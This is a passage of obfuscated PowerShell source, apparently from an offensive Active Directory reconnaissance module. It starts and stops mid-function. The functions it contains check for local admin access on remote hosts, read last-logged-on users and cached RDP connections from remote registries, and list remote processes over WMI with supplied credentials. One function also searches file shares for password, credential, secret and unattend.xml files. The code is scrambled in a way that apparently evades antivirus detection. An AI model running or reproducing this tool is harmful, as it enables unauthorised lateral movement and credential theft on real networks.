            ${e`Rr} = ${K`ErNEL32}::("{2}{3}{1}{0}"-f'or','r','GetLastE','r').Invoke()
            &("{1}{2}{0}"-f'se','Write-Verb','u') ('LastErr'+'or:'+' '+"$Err")
        }
    }
}


function i`NVokE-c`HEcKl`Oc`A`lAdMiNacc`EsS {


    [CmdletBinding()]
    param(
        [Parameter(vAlUeFrompipeLINe=${T`RUe})]
        [String]
        [Alias({"{0}{1}" -f'HostNam','e'})]
        ${co`MPU`TeRNa`Me} = ("{1}{2}{0}" -f'ost','local','h')
    )

    begin {
        if (${p`SbO`Un`D`p`ArAmETErs}[("{1}{0}" -f'ebug','D')]) {
            ${DEB`UGPRe`Fe`REn`cE} = ("{0}{1}{2}"-f'Co','ntin','ue')
        }
    }

    process {

        
        ${CO`MPUTerNA`mE} = &("{2}{3}{0}{1}" -f 'Fie','ld','Get-N','ame') -Object ${C`omP`UT`ErNaMe}

        
        
        ${h`AND`Le} = ${aDvAP`I`32}::("{1}{2}{0}{3}" -f'C','Open','S','ManagerW').Invoke("\\$ComputerName", ("{2}{0}{1}{3}" -f'vicesA','ct','Ser','ive'), 0xF003F)

        &("{0}{1}{2}" -f 'Write','-','Debug') ('In'+'v'+'ok'+'e'+'-'+'CheckLocalAd'+'minAccess '+'h'+'and'+'le: '+"$Handle")

        
        if (${h`AND`Le} -ne 0) {
            
            ${nu`ll} = ${advA`p`i32}::("{0}{1}{2}{3}"-f 'CloseS','ervice','Hand','le').Invoke(${H`AN`dLE})
            ${t`RuE}
        }
        else {
            
            
            ${E`RR} = ${Kern`E`L`32}::("{0}{1}{2}{3}" -f 'GetL','a','st','Error').Invoke()
            &("{2}{1}{0}"-f 'ebug','e-D','Writ') ('In'+'v'+'oke-CheckL'+'o'+'calAdmi'+'nAc'+'ce'+'ss '+'L'+'ast'+'Error: '+"$Err")
            ${fAl`sE}
        }
    }
}


function Ge`T-LastLOGGE`d`On {


    [CmdletBinding()]
    param(
        [Parameter(ValUEfrOmpipeLIne=${t`RUE})]
        [String]
        [Alias({"{0}{1}"-f'HostN','ame'})]        
        ${c`OM`p`UTERNA`me} = "."
    )

    process {

        
        ${C`oMPU`TernaMe} = &("{2}{1}{3}{0}" -f 'ield','Name','Get-','F') -Object ${CO`MpuTe`RnA`ME}

        
        try {
            ${r`EG} = [WMIClass]"\\$ComputerName\root\default:stdRegProv"
            ${H`klM} = 2147483650
            ${k`ey} = ((("{11}{2}{1}{14}{8}{12}{7}{4}{6}{10}{5}{13}{3}{0}{9}"-f 'onU','FTWARE','O','ionrWeLog','trW','rr','eWindo','sof','ic','I','wsrWeCu','S','ro','entVersionrWeAuthenticat','rWeM'))."R`EPLA`Ce"(([CHAR]114+[CHAR]87+[CHAR]101),'\'))
            ${V`A`lUe} = ("{2}{3}{0}{1}"-f 'edOn','User','LastLo','gg')
            ${r`EG}.("{0}{1}{2}"-f 'Ge','tString','Value').Invoke(${HK`LM}, ${k`ey}, ${vAL`Ue})."sv`ALue"
        }
        catch {
            &("{1}{0}{3}{2}"-f '-War','Write','ing','n') ('[!]'+' '+'E'+'rr'+'or '+'o'+'pe'+'ning '+'r'+'emote '+'r'+'egistry '+'on'+' '+"$ComputerName. "+'R'+'emot'+'e '+'r'+'egistr'+'y '+'likel'+'y'+' '+'no'+'t '+'enabl'+'ed.')
            ${N`ULl}
        }
    }
}


function Get-`cAcHEdr`DpCON`N`E`CtIoN {


    [CmdletBinding()]
    param(
        [Parameter(vAluEFROmPipELInE=${Tr`Ue})]
        [String]
        ${computeR`N`AMe} = ("{0}{2}{1}"-f 'local','t','hos'),

        [String]
        ${reMot`e`UsEr`NamE},

        [String]
        ${remoT`ep`AsSw`ord}
    )

    begin {
        if (${Re`mOTEUs`erNa`Me} -and ${r`eM`otEp`ASsword}) {
            ${PA`s`S`woRD} = ${remo`TEpaS`S`Wo`RD} | &("{0}{6}{5}{3}{2}{4}{1}"-f'C','ing','t','S','r','o-Secure','onvertT') -AsPlainText -Force
            ${c`R`e`dentIaL} = &("{0}{2}{1}" -f'N','ct','ew-Obje') ("{2}{4}{6}{0}{3}{9}{10}{5}{1}{8}{7}"-f 'e','S','System.M','nt.','an','n.P','agem','dential','Cre','Autom','atio')(${RE`m`oTeuse`Rn`AMe},${Pa`s`S`worD})
        }

        
        ${H`Ku} = 2147483651
    }

    process {

        try {
            if(${CReD`e`N`TiAL}) {
                ${R`EG} = &("{0}{3}{2}{1}"-f 'Get-Wmio','t','jec','b') -List ("{3}{0}{1}{2}"-f 'eg','Pro','v','StdR') -Namespace ((("{2}{3}{1}{0}"-f'ault','t{0}def','r','oo'))-F  [cHAR]92) -Computername ${Co`mpUTeR`NAMe} -Credential ${creDenT`I`AL} -ErrorAction ("{2}{0}{1}"-f 'ntin','ue','SilentlyCo')
            }
            else {
                ${R`EG} = &("{3}{2}{0}{1}"-f'Wmiobj','ect','et-','G') -List ("{1}{2}{0}" -f'v','S','tdRegPro') -Namespace ((("{1}{3}{0}{2}" -f '1d','ro','efault','otXm')) -REPlacE  ([cHar]88+[cHar]109+[cHar]49),[cHar]92) -Computername ${c`oM`PuternAME} -ErrorAction ("{2}{1}{0}{3}"-f'on','entlyC','Sil','tinue')
            }
        }
        catch {
            &("{3}{1}{0}{2}"-f 'Wa','ite-','rning','Wr') ('Error'+' '+'a'+'cc'+'ess'+'ing '+"$ComputerName, "+'lik'+'ely '+'ins'+'uff'+'icient '+'pe'+'r'+'missions '+'o'+'r '+'fire'+'wa'+'ll '+'r'+'ule'+'s '+'on'+' '+'ho'+'st')
        }

        if(!${R`Eg}) {
            &("{1}{3}{2}{0}"-f'rning','Wri','-Wa','te') ('Error'+' '+'a'+'cce'+'ssing '+"$ComputerName, "+'l'+'ikely '+'insu'+'ffici'+'en'+'t '+'pe'+'rmi'+'s'+'sions '+'or'+' '+'fir'+'e'+'wall '+'rul'+'es '+'on'+' '+'h'+'ost')
        }
        else {
            
            ${USe`R`S`idS} = (${r`EG}.("{0}{1}" -f 'Enum','Key').Invoke(${h`ku}, ""))."sn`AM`es" | &('?') { ${_} -match (('S-1-'+'5-2'+'1-[0-'+'9]+-['+'0-'+'9'+']+-[0-9]'+'+-[0-9'+']+SVJ')."rEp`lACe"(([cHAr]83+[cHAr]86+[cHAr]74),[STriNg][cHAr]36)) }

            foreach (${US`eR`sid} in ${USers`I`DS}) {

                try {
                    ${uSEr`N`AME} = &("{0}{3}{2}{1}" -f 'C','SidToName','vert-','on') ${u`SeR`Sid}

                    
                    ${coNN`ECtI`OnKeyS} = ${r`Eg}.("{1}{3}{0}{2}"-f'l','En','ues','umVa').Invoke(${H`ku},("$UserSID\Software\Microsoft\Terminal "+'Serve'+'r '+(('Clien'+'t'+'gv0De'+'fau'+'lt')-REpLACE ([CHar]103+[CHar]118+[CHar]48),[CHar]92)))."sN`AmEs"

                    foreach (${coNN`ecT`ION} in ${cONNEC`TioN`kE`ys}) {
                        
                        if(${Co`NNE`CTI`oN} -match ("{1}{0}" -f'.*','MRU')) {
                            ${TAR`GE`T`SE`RVEr} = ${R`EG}.("{1}{2}{0}" -f'alue','GetStrin','gV').Invoke(${h`Ku}, ("$UserSID\Software\Microsoft\Terminal "+'Server'+' '+('Client'+'57ED'+'ef'+'ault')."r`Ep`lACe"(([char]53+[char]55+[char]69),'\')), ${c`O`NneCTI`on})."sVA`L`UE"
                            
                            ${f`OUN`dC`O`NnECtI`ON} = &("{0}{2}{1}" -f'New-O','ect','bj') ("{0}{1}{2}"-f'PS','Obje','ct')
                            ${FOUnDCon`Ne`C`TioN} | &("{2}{0}{1}{3}" -f 'mb','e','Add-Me','r') ("{0}{3}{2}{1}" -f 'N','y','rt','oteprope') ("{2}{0}{1}{3}"-f 'omp','uterNam','C','e') ${cOm`P`UTerNAMe}
                            ${fo`UNDCONNecTi`ON} | &("{1}{2}{3}{0}" -f'ber','Add-M','e','m') ("{3}{0}{1}{2}"-f'tep','r','operty','No') ("{1}{2}{0}"-f'e','User','Nam') ${U`sERn`AmE}
                            ${fO`UNd`Co`N`NecTIoN} | &("{0}{2}{1}" -f'Ad','Member','d-') ("{3}{2}{0}{1}"-f 'rop','erty','p','Note') ("{2}{0}{1}" -f'er','SID','Us') ${US`E`RsiD}
                            ${fou`Ndc`O`NN`EcTiOn} | &("{1}{2}{3}{0}"-f 'r','Ad','d','-Membe') ("{2}{3}{1}{0}"-f 'erty','p','No','tepro') ("{1}{0}{3}{2}" -f't','Targe','erver','S') ${TARG`ETS`er`Ver}
                            ${FOU`Ndco`N`N`eCti`ON} | &("{2}{0}{1}" -f'dd-Memb','er','A') ("{2}{1}{0}"-f'eproperty','ot','N') ("{1}{3}{2}{0}"-f'Hint','Use','ame','rn') ${Nu`ll}
                            ${fOund`COnNEct`I`on}
                        }
                    }

                    
                    ${S`E`RverK`eYs} = ${r`Eg}.("{0}{1}" -f'Enu','mKey').Invoke(${H`KU},("$UserSID\Software\Microsoft\Terminal "+'Se'+'rve'+'r '+('C'+'lie'+'ntNoxS'+'erv'+'ers')."re`Pl`ACe"(([CHAR]78+[CHAR]111+[CHAR]120),[sTRINg][CHAR]92)))."snAM`eS"

                    foreach (${S`e`Rver} in ${s`ERve`RK`Eys}) {

                        ${U`SERna`m`ehINt} = ${R`eg}.("{0}{2}{3}{1}{4}" -f'GetStr','l','in','gVa','ue').Invoke(${h`kU}, ("$UserSID\Software\Microsoft\Terminal "+'Serve'+'r '+"Client\Servers\$Server"), ("{3}{1}{2}{0}" -f 'Hint','sernam','e','U'))."SvA`l`Ue"
                        
                        ${f`Ou`N`DcoNnec`Ti`on} = &("{0}{1}{2}"-f 'New-','Obje','ct') ("{0}{2}{1}"-f'P','t','SObjec')
                        ${FoUn`dC`onn`eCTION} | &("{2}{1}{0}" -f'd-Member','d','A') ("{2}{0}{1}{3}"-f 'op','er','Notepr','ty') ("{3}{0}{2}{1}"-f'pu','ame','terN','Com') ${cOm`Pu`TErN`AMe}
                        ${FOUn`dco`N`N`eCTiOn} | &("{2}{0}{1}{3}"-f 'dd-M','emb','A','er') ("{1}{2}{0}{3}"-f 'rope','Not','ep','rty') ("{1}{2}{0}" -f'me','UserN','a') ${Us`ErnaMe}
                        ${foU`Ndc`oNNEctiOn} | &("{2}{0}{1}"-f 'd-','Member','Ad') ("{2}{0}{1}{3}" -f 'epr','oper','Not','ty') ("{1}{0}{2}" -f'se','U','rSID') ${USer`s`ID}
                        ${FO`UNDcoNnEc`TIoN} | &("{1}{0}{2}" -f'dd-Me','A','mber') ("{0}{2}{1}"-f'Not','operty','epr') ("{1}{2}{3}{0}"-f'rver','Tar','g','etSe') ${SER`VEr}
                        ${f`Ound`CONnE`ctIon} | &("{0}{1}{2}" -f'Ad','d-M','ember') ("{1}{3}{0}{2}" -f'te','N','property','o') ("{1}{2}{0}"-f 't','UsernameH','in') ${UsErname`h`INT}
                        ${fo`UNDConNEC`T`iON}   
                    }

                }
                catch {
                    &("{0}{2}{3}{1}"-f'W','g','ri','te-Debu') ('Err'+'or'+': '+"$_")
                }
            }
        }
    }
}


function GET-NEtpRo`ce`SS {


    [CmdletBinding()]
    param(
        [Parameter(VaLUeFrompIPEliNE=${Tr`UE})]
        [String]
        ${C`omPU`TEr`NAme},

        [String]
        ${rem`oTEusE`Rn`AME},

        [String]
        ${R`E`MoTEP`ASsWo`RD}
    )

    process {
        
        if(${c`o`MpUtErN`Ame}) {
            
            ${c`ompuT`Er`NAMe} = &("{2}{0}{1}" -f 't-Name','Field','Ge') -Object ${COMPu`TER`Na`me}          
        }
        else {
            
            ${comput`ER`NAme} =  ${2ODJ`Z9}::("{1}{0}{2}" -f 'Na','GetHost','me').Invoke()
        }

        ${cRE`DEnti`Al} = ${n`ULL}

        if(${R`e`mOteuSERn`A`Me}) {
            if(${R`eMOteP`ASsWord}) {
                ${pas`S`wo`RD} = ${rEmote`p`A`sSWorD} | &("{2}{4}{5}{1}{3}{0}" -f'ing','ec','Con','ureStr','vert','To-S') -AsPlainText -Force
                ${c`ReDe`NTIaL} = &("{1}{0}{2}"-f 'Objec','New-','t') ("{8}{6}{2}{0}{9}{3}{5}{1}{4}{7}"-f'.Manageme','e','m','tion','dentia','.PSCr','e','l','Syst','nt.Automa')(${REmoteu`Se`RnaME},${pa`SS`word})

                
                try {
                    &("{2}{0}{1}"-f'Iobje','ct','Get-WM') -Class ("{2}{1}{3}{0}"-f 'process','i','W','n32_') -ComputerName ${C`O`MPUter`Name} -Credential ${c`Red`ENTI`AL} | &("{3}{2}{0}{1}"-f 'ach-Ob','ject','orE','F') {
                        ${Ow`NER} = ${_}.("{0}{1}{2}" -f'ge','to','wner').Invoke();
                        ${pro`CEss} = &("{2}{1}{0}"-f 't','ew-Objec','N') ("{1}{0}{2}" -f'jec','PSOb','t')
                        ${P`R`oCEsS} | &("{2}{0}{1}"-f 'dd-Me','mber','A') ("{1}{0}{2}{3}"-f'tep','No','ropert','y') ("{0}{1}{3}{2}" -f 'C','omputer','me','Na') ${c`OMP`Uter`N`AMe}
                        ${p`R`ocESs} | &("{0}{2}{1}" -f'Add-Me','er','mb') ("{2}{3}{0}{1}" -f'per','ty','Notepr','o') ("{0}{2}{1}"-f'P','e','rocessNam') ${_}."Pr`ocesS`N`Ame"
                        ${Pr`ocE`SS} | &("{1}{3}{2}{0}"-f'Member','A','d-','d') ("{3}{2}{1}{0}" -f 'y','t','roper','Notep') ("{3}{1}{2}{0}" -f 'D','oc','essI','Pr') ${_}."PRoce`s`SiD"
                        ${p`Ro`CeSS} | &("{0}{1}{2}{3}" -f 'A','d','d','-Member') ("{0}{2}{1}"-f 'Notepr','rty','ope') ("{1}{0}"-f'omain','D') ${o`wN`Er}."doM`AIn"
                        ${prOc`E`SS} | &("{1}{3}{2}{0}"-f 'mber','A','-Me','dd') ("{2}{3}{0}{1}" -f 'p','roperty','N','ote') ("{0}{1}" -f'Us','er') ${OW`NEr}."u`sER"
                        ${p`RoC`esS}
                    }
                }
                catch {
                    &("{2}{1}{0}"-f '-Verbose','e','Writ') ('[!'+'] '+'Err'+'or '+'e'+'num'+'e'+'rating '+'r'+'em'+'ote '+'p'+'r'+'o'+'cesses, '+'acc'+'ess '+'l'+'ikely '+'deni'+'ed:'+' '+"$_")
                }
            }
            else {
                &("{1}{2}{0}"-f'ng','Wr','ite-Warni') ("{6}{3}{2}{4}{0}{7}{1}{5}{8}"-f'ssword mu',' ','teP','emo','a','suppli','[!] R','st also be','ed!')
            }
        }
        else {
            
            try {
                &("{1}{0}{2}" -f'bje','Get-WMIo','ct') -Class ("{3}{1}{0}{4}{2}" -f'o','2_pr','ss','Win3','ce') -ComputerName ${coM`pUt`ern`AmE} | &("{3}{0}{1}{2}"-f'orE','ach-Ob','ject','F') {
                    ${Own`eR} = ${_}.("{0}{1}{2}"-f'ge','towne','r').Invoke();
                    ${pr`oceSs} = &("{1}{0}{2}"-f'bje','New-O','ct') ("{1}{0}"-f'ct','PSObje')
                    ${pr`oC`esS} | &("{1}{2}{0}"-f 'ber','Ad','d-Mem') ("{0}{1}{2}"-f 'Not','epro','perty') ("{0}{3}{2}{1}" -f'Co','Name','ter','mpu') ${coMPUTE`RNa`mE}
                    ${prO`c`Ess} | &("{0}{1}{2}" -f 'Add-Me','mbe','r') ("{1}{0}{2}"-f 'eprop','Not','erty') ("{2}{1}{0}" -f'ame','ssN','Proce') ${_}."p`ROCeSsN`A`mE"
                    ${PrO`ce`sS} | &("{0}{1}{2}" -f 'A','dd-Me','mber') ("{1}{0}{2}{3}" -f'ot','N','ep','roperty') ("{0}{1}" -f'Proc','essID') ${_}."P`RoCeS`siD"
                    ${p`RoCe`ss} | &("{2}{0}{1}{3}"-f'd-M','emb','Ad','er') ("{0}{2}{1}{3}" -f'N','roper','otep','ty') ("{1}{0}" -f'n','Domai') ${oWN`ER}."DOm`AiN"
                    ${pRocE`Ss} | &("{1}{0}{2}" -f '-Memb','Add','er') ("{1}{2}{3}{0}"-f 'ty','Not','epro','per') ("{0}{1}"-f 'U','ser') ${ow`NER}."U`SEr"
                    ${p`RocesS}
                }
            }
            catch {
                &("{2}{3}{1}{4}{0}" -f'se','t','W','ri','e-Verbo') ('[!]'+' '+'E'+'rro'+'r '+'enumera'+'t'+'in'+'g '+'re'+'mo'+'te '+'p'+'roce'+'ss'+'es, '+'acc'+'ess'+' '+'li'+'ke'+'ly '+'d'+'enie'+'d: '+"$_")
            }
        }
    }
}


function finD-INte`ReS`Ti`NgFilE {


    [CmdletBinding()]
    param(
        [Parameter(vaLUeFRoMpipeLIne=${T`RUE})]
        [String]
        ${P`AtH} = '.\',

        [String[]]
        ${te`Rms},

        [Switch]
        ${OFfICE`DO`cs},

        [Switch]
        ${fREsH`EX`es},

        [String]
        ${lA`s`TAcceSstI`me},

        [String]
        ${L`AS`TWr`Ite`TimE},

        [String]
        ${C`ReAtiOnT`imE},

        [Switch]
        ${eXClUDE`F`OlDeRs},

        [Switch]
        ${exclUD`eH`idd`eN},

        [Switch]
        ${C`H`e`ckwRIT`E`AcCesS},

        [String]
        ${oU`TfIle},

        [Switch]
        ${USe`pSDR`I`Ve},

        [System.Management.Automation.PSCredential]
        ${c`Red`EN`TIAL} =  (  &("{4}{2}{3}{0}{1}" -f 'i','LdITEM','C','h','Get-') VAriAbLE:T65pi  ).vAlue::"EMp`Ty"
    )

    begin {
        
        ${s`e`ArchT`ErMs} = @(("{1}{0}"-f's','pas'), ("{0}{1}{2}" -f's','e','nsitive'), ("{1}{0}"-f 'min','ad'), ("{1}{0}"-f'in','log'), ("{1}{0}"-f'cret','se'), ("{1}{3}{2}{0}" -f '.xml','u','tend*','nat'), ("{1}{0}" -f'vmdk','.'), ("{0}{1}"-f 'cr','eds'), ("{2}{0}{1}"-f 'redent','ial','c'), ("{0}{1}" -f '.c','onfig'))

        if(!${P`ATH}.("{0}{1}{2}" -f 'End','sWit','h').Invoke('\')) {
            ${p`ATh} = ${P`ATh} + '\'
        }
        if(${CREd`enT`iaL} -ne  ( &("{0}{2}{1}" -f 'vARi','E','abL') t65pI  -vaLUeOnL  )::"emP`Ty") { ${us`EpSDR`I`VE} = ${T`RUE} }

        
        if (${T`Erms}) {
            if(${Te`R`MS} -isnot [system.array]) {
                ${t`eRmS} = @(${Te`RMS})
            }
            ${SEA`R`cHterms} = ${t`er`MS}
        }

        if(-not ${SeA`RcHt`E`RMs}[0].("{1}{2}{0}{3}"-f 'swi','st','art','th').Invoke("*")) {
            
            for (${i} = 0; ${i} -lt ${seA`Rch`T`eRMS}."co`Unt"; ${i}++) {
                ${s`Ear`chtE`RmS}[${I}] = "*$($SearchTerms[$i])*"
            }
        }

        
        if (${ofF`I`ced`OCS}) {
            ${se`A`RCHtE`RmS} = @(("{0}{1}" -f'*.d','oc'), ("{0}{1}" -f '*.do','cx'), ("{1}{0}"-f's','*.xl'), ("{1}{0}"-f 'sx','*.xl'), ("{1}{0}"-f't','*.pp'), ("{0}{1}"-f'*.pp','tx'))
        }

        
        if(${Fre`sH`eXeS}) {
            
            ${LASta`CcE`S`S`TIme} = (&("{2}{1}{0}" -f'-date','et','g')).("{2}{1}{0}" -f 'dDays','d','A').Invoke(-7).("{2}{0}{1}"-f 'oStr','ing','T').Invoke(("{1}{0}{2}" -f'dd/','MM/','yyyy'))
            ${s`EarC`hT`ErmS} = ("{1}{0}" -f 'xe','*.e')
        }

        if(${US`e`PSdRi`VE}) {
            
            ${P`ArtS} = ${p`ATH}.("{1}{0}" -f 'it','spl').Invoke('\')
            ${f`Ol`D`ERpAtH} = ${paR`Ts}[0..(${pA`R`Ts}."lEnG`TH"-2)] -join '\'
            ${fIL`E`PAth} = ${p`A`RtS}[-1]
            ${r`ANd`dR`Ive} = (("{4}{1}{6}{3}{5}{2}{0}" -f'stuvwxyz','bcdef','r','ijk','a','lmnopq','gh').("{3}{0}{1}{2}"-f 'oC','har','Array','T').Invoke() | &("{1}{0}{2}"-f'Ran','Get-','dom') -Count 7) -join ''
            
            &("{3}{1}{2}{0}"-f 'se','rb','o','Write-Ve') ('M'+'ount'+'ing '+'pa'+'th '+"$Path "+'u'+'sing '+'a '+'t'+'emp '+'PSD'+'riv'+'e '+'a'+'t '+"$RandDrive")

            try {
                ${N`ULl} = &("{2}{1}{0}"-f 'e','Driv','New-PS') -Name ${r`ANDd`RIve} -Credential ${cR`EDe`NtIaL} -PSProvider ("{0}{2}{1}"-f 'File','tem','Sys') -Root ${f`OldErPA`Th} -ErrorAction ("{0}{1}"-f'Sto','p')
            }
            catch {
                &("{2}{3}{1}{0}" -f'ebug','te-D','Wr','i') ('Err'+'or '+'m'+'ounti'+'ng '+'p'+'ath '+"$Path "+': '+"$_")
                return ${nu`LL}
            }

            
            ${pA`TH} = ${R`AND`dr`IVE} + ":\" + ${f`ILepA`Th}
        }
    }

    process {

        &("{2}{0}{1}" -f'ite-Ver','bose','Wr') ('[*'+'] '+'Se'+'arch '+'path'+' '+"$Path")

        function InV`oKe`-CHeckWR`iTE {
            
            [CmdletBinding()]param([String]${PA`Th})
            try {
                ${f`I`lETe`ST} =  ${s`iA}::("{2}{0}{1}"-f'nWr','ite','Ope').Invoke(${PA`TH})
                ${f`ILeT`EST}.("{1}{0}"-f 'se','Clo').Invoke()
                ${tr`Ue}
            }
            catch {
                &("{3}{1}{0}{2}" -f'te','i','-Verbose','Wr') -Message ${Err`or}[0]
                ${F`AL`se}
            }
        }

        ${S`eAR`ch`ARgs} =  @{
            ("{0}{1}"-f 'P','ath') = ${P`ATH}
            ("{1}{0}"-f 'rse','Recu') = ${tr`UE}
            ("{1}{0}"-f 'rce','Fo') = $(-not ${e`Xcl`Ude`HIDD`EN})
            ("{0}{1}" -f'Includ','e') = ${sEarC`h`T`ERMS}
            ("{0}{2}{1}" -f 'Er','orAction','r') = ("{2}{1}{0}{3}" -f 'entlyConti','l','Si','nue')
        }

        &("{0}{1}{2}{3}"-f 'Get-C','hi','l','dItem') @SearchArgs | &("{3}{2}{0}{1}" -f 'j','ect','rEach-Ob','Fo') {
            &("{0}{1}{2}"-f'Wr','i','te-Verbose') ${_}
            
            if(!${E`XcLUD`eFo`ldE`Rs} -or !${_}."psISCoN`T`AiNer") {${_}}
        } | &("{3}{2}{4}{0}{1}"-f 'je','ct','rEac','Fo','h-Ob') {
            if(${La`stACCesstI`ME} -or ${l`A`s`T`wrIteTIMe} -or ${cre`At`Io`NTIME}) {
                if(${lA`stA`cCESSTI`me} -and (${_}."L`ASTac`CeSs`T`IME" -gt ${l`A`staCcEs`StiMe})) {${_}}
                elseif(${lAStW`Ri`T`eTi`Me} -and (${_}."l`AStW`RitE`TiME" -gt ${L`AStwRIT`E`TIME})) {${_}}
                elseif(${Cre`ATi`o`NTiME} -and (${_}."CrEaTi`ONt`iME" -gt ${cR`e`ATIoNTIme})) {${_}}
            }
            else {${_}}
        } | &("{0}{1}{2}"-f'For','E','ach-Object') {
            
            if((-not ${c`H`Eckw`Ri`T`eaccess}) -or (&("{4}{2}{3}{1}{0}"-f'eckWrite','-Ch','vo','ke','In') -Path ${_}."FUlLN`AMe")) {${_}}
        } | &("{2}{1}{0}{4}{3}"-f'-','t','Selec','bject','O') ("{1}{2}{0}" -f'ame','Ful','lN'),@{("{1}{0}" -f 'ame','N')=("{1}{0}"-f'er','Own');("{0}{2}{1}" -f 'Express','on','i')={(&("{1}{0}"-f't-Acl','Ge') ${_}."f`ULl`Name")."oW`NeR"}},("{2}{4}{1}{0}{3}"-f 'e','c','Las','ssTime','tAc'),("{1}{3}{2}{0}{4}" -f 'te','Las','Wri','t','Time'),("{0}{3}{1}{2}"-f 'Cr','i','onTime','eat'),("{0}{1}{2}" -f 'Le','n','gth') | &("{0}{3}{1}{2}" -f 'F','rEa','ch-Object','o') {
            
            if(${ou`T`FiLE}) {&("{5}{6}{3}{2}{4}{0}{1}"-f 'ewC','SV','-Power','t','Vi','E','xpor') -InputObject ${_} -OutFile ${ou`TF`ile}}
            else {${_}}
        }
    }

    end {
        if(${USEp`SDR`iVE} -and ${Ra`ND`DRivE}) {
            &("{0}{1}{2}" -f'W','rite','-Verbose') ('Remov'+'ing'+' '+'tem'+'p '+'PS'+'Drive'+' '+"$RandDrive")
            &("{0}{1}{2}"-f 'G','et-PSDr','ive') -Name ${ranDD`R`I`Ve} -ErrorAction ("{1}{2}{0}" -f'ntinue','Silen','tlyCo') | &("{0}{2}{1}"-f 'Remove-P','e','SDriv')
        }
    }
}








function In`VoK`e`-tHReADEDfUN`c`TIoN {
    
    [CmdletBinding()]
    param(
        [Parameter(poSiTIOn=0,MANDatORY=${T`Rue})]
        [String[]]
        ${cOMPu`T`ErnA`me},

        [Parameter(POsiTIoN=1,MaNdATORy=${Tr`UE})]
        [System.Management.Automation.ScriptBlock]
        ${sCRI`p`T`BlOCK},

        [Parameter(POsitION=2)]
        [Hashtable]
        ${S`CRIPT`PAr`AmetErS},

        [Int]
        ${thReA`Ds} = 20,

        [Switch]
        ${No`Im`pO`RtS}
    )

    begin {

        if (${pSboU`NDPA`Ram`ETe`RS}[("{1}{0}" -f'g','Debu')]) {
            ${DeBUGPR`e`FE`R`enCE} = ("{1}{2}{0}"-f'e','Con','tinu')
        }

        &("{4}{1}{0}{2}{3}" -f 'te','i','-Verb','ose','Wr') "[*] Total number of hosts: $($ComputerName.count) "

        
        
        ${sEs`s`ioNsTa`TE} =   ${C`43J}::("{2}{1}{0}" -f 'ault','teDef','Crea').Invoke()
        ${sE`ssIoN`St`ATe}."ap`Artm`ENt`sTA`TE" =   ${0`Kbl}::"c`URr`E`NtTH`ReAD".("{3}{5}{0}{1}{2}{4}"-f 't','m','entSt','GetApa','ate','r').Invoke()

        
        
        if(!${NoiMP`o`RTs}) {

            
            ${MY`VARs} = &("{3}{0}{1}{2}"-f 'e','t','-Variable','G') -Scope 2

            
            ${v`oR`BiDden`V`ARs} = @("?",("{0}{1}"-f'a','rgs'),("{4}{3}{0}{1}{2}" -f 'eFil','eNam','e','ol','Cons'),("{1}{0}" -f 'r','Erro'),("{1}{2}{0}{3}"-f'ecutionCo','E','x','ntext'),("{0}{1}"-f 'f','alse'),("{1}{0}" -f'OME','H'),("{0}{1}"-f 'Ho','st'),("{1}{0}"-f 'nput','i'),("{2}{0}{1}"-f'ut','Object','Inp'),("{4}{2}{3}{0}{1}" -f'n','t','mumAli','asCou','Maxi'),("{1}{3}{5}{0}{2}{4}"-f'Driv','Maxi','eCoun','m','t','um'),("{1}{3}{4}{2}{0}"-f 't','Maximum','n','Err','orCou'),("{3}{2}{1}{4}{0}" -f'nt','Fu','um','Maxim','nctionCou'),("{1}{0}{4}{5}{3}{2}" -f 'aximumHi','M','nt','Cou','stor','y'),("{1}{0}{2}{4}{3}"-f 'ximumVari','Ma','ab','unt','leCo'),("{0}{2}{1}" -f 'MyIn','cation','vo'),("{0}{1}" -f 'nu','ll'),"PID",("{1}{2}{3}{0}" -f 'ters','PSBo','und','Parame'),("{1}{3}{0}{2}" -f 'ommand','PS','Path','C'),("{2}{1}{0}"-f'e','Cultur','PS'),("{6}{3}{2}{7}{4}{5}{0}{1}" -f'lu','es','efau','SD','ter','Va','P','ltParame'),("{0}{1}{2}"-f 'P','SHOM','E'),("{2}{1}{0}" -f 'ptRoot','cri','PSS'),("{2}{1}{0}"-f'e','ltur','PSUICu'),("{3}{4}{0}{2}{1}" -f 'e','Table','rsion','PS','V'),"PWD",("{1}{0}" -f'd','ShellI'),("{0}{2}{3}{1}" -f 'Sync','h','hroni','zedHas'),("{0}{1}" -f 'tr','ue'))

            
            ForEach(${V`AR} in ${M`YvarS}) {
                if(${VORbi`D`D`envArs} -NotContains ${v`Ar}."N`AMe") {
                ${ses`s`iOnST`A`Te}."v`A`RIabLEs".("{1}{0}" -f 'd','Ad').Invoke((&("{0}{1}{2}"-f'New-Obj','e','ct') -TypeName ("{15}{0}{10}{18}{6}{16}{14}{8}{12}{3}{5}{17}{11}{7}{9}{2}{4}{1}{13}{19}" -f's','bl','ateVari','nspaces','a','.','.Aut','sio','tio','nSt','tem.M','es','n.Ru','eEntr','a','Sy','om','S','anagement','y') -ArgumentList ${v`Ar}."n`AmE",${v`AR}."Va`LUE",${v`AR}."dESc`RiPT`i`On",${V`Ar}."OP`TIO`NS",${V`AR}."aTT`RI`BUt`es"))
                }
            }

            
            ForEach(${fu`N`CtIoN} in (&("{1}{0}{2}" -f'ldIt','Get-Chi','em') ("{1}{2}{0}"-f ':','Functio','n'))) {
                ${SeSSI`O`NS`TaTe}."Comm`A`NDs".("{1}{0}" -f 'd','Ad').Invoke((&("{1}{2}{0}"-f 'ct','New-','Obje') -TypeName ("{5}{2}{0}{11}{4}{6}{1}{8}{7}{3}{10}{12}{9}"-f 'ent','.Runs','ystem.Managem','ces.','ma','S','tion','a','p','StateFunctionEntry','Se','.Auto','ssion') -ArgumentList ${FUNC`TI`On}."na`ME", ${Fun`cTI`oN}."De`FINITi`on"))
            }
        }

        
        
        

        
        ${P`oOl} =   (&('gI')  ('VArIab'+'LE'+':xgn'+'AiB') ).VaLUe::("{5}{2}{1}{0}{4}{3}" -f'nspace','u','reateR','l','Poo','C').Invoke(1, ${t`hRea`ds}, ${s`esSiOnS`Ta`TE}, ${H`OST})
        ${p`oOL}.("{0}{1}"-f'Ope','n').Invoke()

        ${J`oBS} = @()
        ${PS} = @()
        ${W`Ait} = @()

        ${coUN`TER} = 0
    }

    process {

        ForEach (${co`MP`UTer} in ${cOm`P`UtE`RnAME}) {

            
            if (${cO`mP`UTer} -ne '') {
                

                While ($(${P`Ool}.("{4}{2}{5}{3}{1}{0}"-f'spaces','un','etAv','R','G','ailable').Invoke()) -le 0) {
                    &("{3}{1}{0}{2}"-f 'Sl','-','eep','Start') -MilliSeconds 500
                }

                
